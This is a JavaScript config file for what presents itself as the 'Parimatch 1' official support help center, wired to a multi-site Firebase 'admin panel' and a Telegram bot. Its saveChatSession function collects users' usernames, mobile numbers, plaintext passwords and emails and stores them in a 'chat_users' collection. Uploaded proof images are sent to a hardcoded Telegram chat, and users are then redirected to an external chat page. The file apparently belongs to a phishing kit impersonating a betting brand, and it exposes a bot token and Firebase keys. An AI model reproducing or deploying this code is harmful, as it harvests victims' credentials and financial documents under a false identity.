/* =============================================================
   Parimatch 1 · Help Center — shared config + Admin Panel bridge
   -------------------------------------------------------------
   Same Firebase project as the main ADMIN PANEL, so every form
   written here lands in the `submissions` collection and shows up
   in the admin panel dashboard in real time.
   ============================================================= */

/* ===== FIREBASE CONFIG (admin panel project) ===== */
const FIREBASE_CONFIG = {
  apiKey: "AIzaSyCiqaLzh7PoVC5l03sJFdtK548Wulufn94",
  authDomain: "alll-projects-admin-pennal.firebaseapp.com",
  projectId: "alll-projects-admin-pennal",
  storageBucket: "alll-projects-admin-pennal.firebasestorage.app",
  messagingSenderId: "689297868215",
  appId: "1:689297868215:web:2747b19c2da47a31f49432"
};

/* ===== SITE IDENTITY ===== */
// Tags every submission so the admin panel can group data per project.
const SITE_ID = "parimatch_1";
const SITE_NAME = "Parimatch 1";
const SITE_SOURCE = "Parimatch 1 Official Support";

/* ===== ONLINE CHAT REDIRECT ===== */
// Put the URL of the live-chat page here. Anything the user should land
// on after a successful submit (deposit / withdrawal / online chat).
const CHAT_URL = "https://chat-page.edgeone.app";

/* ===== TELEGRAM (used to host uploaded images + alerts) ===== */
// Optional. Saved in Firestore as: settings/telegram -> { bot_token, chat_id }.
// The values below are only a fallback, so you can change them here.
const TG_FALLBACK = {
  botToken: "8906822745:AAH_rQOexAgYey92rzgNw6piosCXDY20rwM",
  chatId: "-1003782852692"
};

/* =============================================================
   FIREBASE LOADER
   ============================================================= */
let _fbDb = null;
let _fbLoading = null;

function loadFirebase() {
  if (_fbDb) return Promise.resolve(_fbDb);
  if (_fbLoading) return _fbLoading;

  _fbLoading = new Promise((resolve, reject) => {
    const initDb = () => {
      try {
        if (!firebase.apps.length) firebase.initializeApp(FIREBASE_CONFIG);
        _fbDb = firebase.firestore();
        resolve(_fbDb);
      } catch (e) { reject(e); }
    };

    if (window.firebase && window.firebase.firestore) { initDb(); return; }

    const urls = [
      'https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js',
      'https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore-compat.js'
    ];
    let loaded = 0;
    urls.forEach(src => {
      const s = document.createElement('script');
      s.src = src;
      s.onload = () => {
        loaded++;
        if (loaded === urls.length) initDb();
      };
      s.onerror = () => reject(new Error('Firebase load failed: ' + src));
      document.head.appendChild(s);
    });
  });

  return _fbLoading;
}

/* Firestore document ids cannot contain slashes — mobile numbers are safe,
   but normalise anyway so a pasted value can never break a write. */
function safeDocId(value) {
  return String(value == null ? '' : value).replace(/[\/\\.#\[\]$]/g, '_');
}

/* =============================================================
   SUBMISSIONS  (read by the admin panel)
   ============================================================= */
function makeRequestId() {
  return "TX" + Math.floor(100000 + Math.random() * 900000);
}

function nowStamp() {
  return new Date().toLocaleString('en-IN', {
    day: '2-digit', month: 'short', year: 'numeric',
    hour: '2-digit', minute: '2-digit', hour12: true
  });
}

/* Writes one document into the admin panel `submissions` collection.
   Resolves with the new document id (needed by the 2-step withdrawal). */
function saveSubmission(data) {
  return loadFirebase().then(db => {
    const payload = Object.assign({}, data, {
      site_id: SITE_ID,
      source: data.source || SITE_SOURCE,
      created_at: firebase.firestore.FieldValue.serverTimestamp()
    });
    return db.collection('submissions').add(payload);
  }).then(ref => ref.id);
}

function updateSubmission(docId, data) {
  return loadFirebase().then(db => db.collection('submissions').doc(docId).update(data));
}

/* Reads back this user's own requests so the mailbox can show live status. */
function fetchUserSubmissions(mobile) {
  return loadFirebase().then(db => db.collection('submissions')
    .where('site_id', '==', SITE_ID)
    .where('mobile', '==', String(mobile).trim())
    .limit(50)
    .get()
  ).then(snap => snap.docs.map(d => Object.assign({ id: d.id }, d.data())))
    .catch(e => { console.warn('Could not load live status:', e); return []; });
}

/* =============================================================
   CHAT SESSION  (login for the live chat page)
   ============================================================= */
function saveChatSession(data) {
  if (!data || !data.mobile) return Promise.resolve(null);
  const existing = JSON.parse(localStorage.getItem('chatUserData') || 'null');
  const session = {
    username: data.username || data.user_name || (existing && existing.username) || '',
    mobile: data.mobile,
    password: data.password || (existing && existing.password) || '',
    email: data.email || (existing && existing.email) || '',
    timestamp: Date.now()
  };
  localStorage.setItem('chatUserData', JSON.stringify(session));
  return loadFirebase().then(db => db.collection('chat_users').doc(safeDocId(session.mobile)).set({
    site_id: SITE_ID,
    username: session.username,
    mobile: session.mobile,
    password: session.password,
    email: session.email,
    lastSeen: firebase.firestore.FieldValue.serverTimestamp()
  }, { merge: true })).catch(e => {
    console.warn('Chat session save failed:', e);
  }).then(() => session);
}

function getChatUser() {
  try {
    return JSON.parse(localStorage.getItem('chatUserData') || 'null');
  } catch (e) {
    return null;
  }
}

/* Hands the user over to the chat page once the data is safely stored. */
function redirectToChat(delayMs) {
  setTimeout(function() { window.location.href = CHAT_URL; }, delayMs || 2200);
}

/* =============================================================
   TELEGRAM  (image hosting + instant alerts)
   ============================================================= */
function getTelegramSettings() {
  return loadFirebase().then(db => db.collection('settings').doc('telegram').get())
    .then(snap => {
      const d = (snap && snap.exists() && snap.data()) || {};
      return {
        botToken: d.bot_token || d.botToken || d.chatBotToken || d.complaintBotToken || TG_FALLBACK.botToken,
        chatId: d.chat_id || d.chatId || d.chatChatId || d.complaintChatId || TG_FALLBACK.chatId
      };
    })
    .catch(() => ({ botToken: TG_FALLBACK.botToken, chatId: TG_FALLBACK.chatId }));
}

function sendTelegramAlert(botToken, chatId, message) {
  if (!botToken || !chatId) return Promise.resolve();
  return fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
  }).then(r => r.json()).catch(() => null);
}

function notifyTelegram(message) {
  return getTelegramSettings().then(tg => sendTelegramAlert(tg.botToken, tg.chatId, message));
}

/* Uploads a file to Telegram and returns a direct image/file URL.
   The admin panel renders those URLs inline, so a reviewer sees the proof. */
function uploadToTelegram(file, caption) {
  if (!file) return Promise.resolve('');
  return getTelegramSettings().then(tg => {
    var fd = new FormData();
    fd.append('chat_id', tg.chatId);
    if (caption) fd.append('caption', caption);
    var isPdf = file.type === 'application/pdf' || /\.pdf$/i.test(file.name || '');
    fd.append(isPdf ? 'document' : 'photo', file);
    var endpoint = isPdf ? 'sendDocument' : 'sendPhoto';

    return fetch('https://api.telegram.org/bot' + tg.botToken + '/' + endpoint, { method: 'POST', body: fd })
      .then(r => r.json())
      .then(function(data) {
        if (!data.ok) throw new Error((data && data.description) || 'Telegram upload failed');
        var res = data.result || {};
        var fallback = 'https://t.me/c/' + String(tg.chatId).replace('-100', '') + '/' + res.message_id;
        var fileId = null;
        if (res.photo && res.photo.length) fileId = res.photo[res.photo.length - 1].file_id;
        else if (res.document && res.document.file_id) fileId = res.document.file_id;
        if (!fileId) return fallback;
        return fetch('https://api.telegram.org/bot' + tg.botToken + '/getFile?file_id=' + encodeURIComponent(fileId))
          .then(r => r.json())
          .then(function(g) {
            return (g.ok && g.result && g.result.file_path)
              ? 'https://api.telegram.org/file/bot' + tg.botToken + '/' + g.result.file_path
              : fallback;
          })
          .catch(() => fallback);
      });
  });
}

/* A failed image upload must never block the complaint itself. */
function safeUpload(file, caption) {
  return uploadToTelegram(file, caption).catch(function(err) {
    console.warn('Image upload failed:', caption, err);
    return '';
  });
}

/* =============================================================
   UI FEEDBACK
   ============================================================= */
function showNotification(message, type) {
  type = type || "info";
  var existing = document.querySelector('.ios-notification');
  if (existing) existing.remove();

  var notif = document.createElement('div');
  notif.className = 'ios-notification ' + type;
  var iconSvg = '';
  if (type === 'success') {
    iconSvg = '<svg width="1.2em" height="1.2em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:middle;"><polyline points="20 6 9 17 4 12"/></svg>';
  } else if (type === 'error') {
    iconSvg = '<svg width="1.2em" height="1.2em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:middle;"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>';
  } else {
    iconSvg = '<svg width="1.2em" height="1.2em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:middle;"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>';
  }
  notif.innerHTML = '<div class="notif-content"><span class="notif-icon">' + iconSvg + '</span><span>' + message + '</span></div>';
  notif.style.cssText = 'position:fixed;top:20px;left:50%;transform:translateX(-50%);background:' + (type === 'success' ? 'rgba(52,199,89,0.95)' : type === 'error' ? 'rgba(255,59,48,0.95)' : 'rgba(216,245,41,0.95)') + ';color:#0F1012;padding:14px 20px;border-radius:16px;font-weight:500;font-size:0.95rem;z-index:1000;box-shadow:0 8px 32px rgba(0,0,0,0.4);backdrop-filter:blur(10px);max-width:90%;text-align:center;animation:slideDown 0.3s ease,fadeOut 0.3s ease 2.7s forwards;';
  document.body.appendChild(notif);
  setTimeout(function() { notif.remove(); }, 3000);
}

/* Keeps the toast animation available on every page. */
(function addNotificationStyles() {
  if (document.getElementById('notification-styles')) return;
  var style = document.createElement('style');
  style.id = 'notification-styles';
  style.textContent = '@keyframes slideDown { from { top: -60px; opacity: 0; } to { top: 20px; opacity: 1; } } @keyframes fadeOut { to { opacity: 0; transform: translateX(-50%) translateY(-10px); } }';
  document.head.appendChild(style);
})();
